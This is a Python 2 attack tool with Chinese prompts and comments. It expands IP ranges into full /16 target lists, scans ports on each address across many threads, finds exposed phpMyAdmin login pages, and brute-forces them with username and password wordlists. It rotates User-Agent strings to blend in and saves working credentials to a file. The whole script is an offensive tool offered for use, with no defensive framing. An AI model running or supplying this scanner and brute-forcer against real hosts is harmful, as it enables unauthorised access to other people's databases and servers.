# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
import socket
import re
import requests
import time
import random
import os
from multiprocessing.dummy import Pool as ThreadPool
reload(sys)
sys.setdefaultencoding('utf-8')
global listport  #端口
global user
global passwd
timeout=6
socket.setdefaulttimeout(timeout)
users=[]
with open('user.txt','r') as u:
    for x in u:
        users.append(x.replace('\n',''))
passwd=[]
with open('password.txt','r')as ps:
    for x in ps:
        passwd.append(x.replace('\n',''))
listport=[]
with open('port.txt','r')as p:
    for x in p:
        listport.append(x.replace('\n',''))
headerss = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
            "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24" ]
def scip():
    try:
        listip = []
        with open('c.txt', 'r')as c:
            for x in c:
                listip.append(x.replace('\n', ''))

        for c_1 in listip:
            c_1_1 = c_1.split('.')[0]
            c_1_2 = c_1.split('.')[1]
            c_1_3 = c_1_1 + '.' + c_1_2 + '.'  # 构成基础
            # 遍历循环
            iplist0 = []
            for i in range(0, 255):
                c_1_4 = c_1_3 + str(i) + '.'
                iplist0.append(c_1_4)
            list1 = []
            for x in iplist0:
                for i in range(0, 255):
                    ip = x + str(i)
                    list1.append(ip)

            with open('target.txt', 'w+')as w:
                for x in list1:
                    w.write(x + '\n')
            with open('c.txt','w')as ww:
                ww.write('')
    except:
        print 'no ip'
        pass

def scan_live(ip):
    try:
        for scanport in listport:
            print '[*] Connect ' + ip + ':' + str(scanport)
            s = socket.socket()
            s.connect((str(ip), int(scanport)))
            s.send('langziyanqing \n')
            cc = s.recv(1024)
            s.close()
            if 'not allowed to' not in cc:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                url = 'http://' + str(ip) + ':' + str(scanport) + '/phpmyadmin/index.php'
                print 'Test:' + url
                try:
                    req = requests.get(url=url, headers=headers, timeout=5)
                    if 'Documentation.html' in req.content:
                        print 'Found Phpmyadmin page  '
                        with open('phpmyadmin.txt','a+')as p:
                            p.write(url + '\n')
                    else:
                        pass
                except Exception, e:
                    print unicode("当前页面非phpmyadmin", 'utf-8')
            else:
                pass
            print cc
            print '\n'
    except Exception, e:
        print e
        s.close()

def burte(urlx):
    for us in users:
        for ps in passwd:
            user = str(us)
            password = str(ps)
            data =  {'pma_username': str(user), 'pma_password': str(password)}
            print urlx + ' Test:' + user + ' ' + password
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                req1 = requests.post(url=urlx,data=data,headers=headers,timeout=10)
                if 'mainFrameset' in req1.content:
                    print unicode('爆破成功','utf-8')
                    with open('success.txt','a+')as a:
                        a.write(urlx + '|' + user + '|' + password + '\n')
                    return user,password
                else:
                    print unicode('密码错误','utf-8')
                    pass
            except Exception, e:
                print e


scipa = int(input(unicode('是否将ip段遍历成ip列表(是:1/否:0):','utf-8').encode('gbk')))
smip = int(input(unicode('是否扫描存活IP以及开放端口(是:1/否:0):','utf-8').encode('gbk')))
smxc = int(input(unicode('设置扫描线程数(100-1000):','utf-8').encode('gbk')))
bpxc = int(input(unicode('设置爆破线程数(10-20):','utf-8').encode('gbk')))
if scipa == 1:
    scip()

if smip == 1:
    listsmip =[]
    with open('target.txt','r')as xx:
        for i in xx:
            listsmip.append(i.replace('\n',''))
    pool = ThreadPool(processes=smxc)  #线程数量
    results = pool.map(scan_live, listsmip)
    pool.close()
    pool.join()
    os.remove('target.txt')


#开始直接爆破
listbp7=[]
with open('phpmyadmin.txt','r') as rs:
    for x in rs:
        listbp7.append(x.replace('\n',''))
listbp = list(set(listbp7))
pool = ThreadPool(processes=bpxc)  #线程数量
result = pool.map(burte, listbp)
pool.close()
pool.join()
os.remove('target.txt')
#os.remove('phpmyadmin.txt') #删除扫描出来是phpmyadmin文件
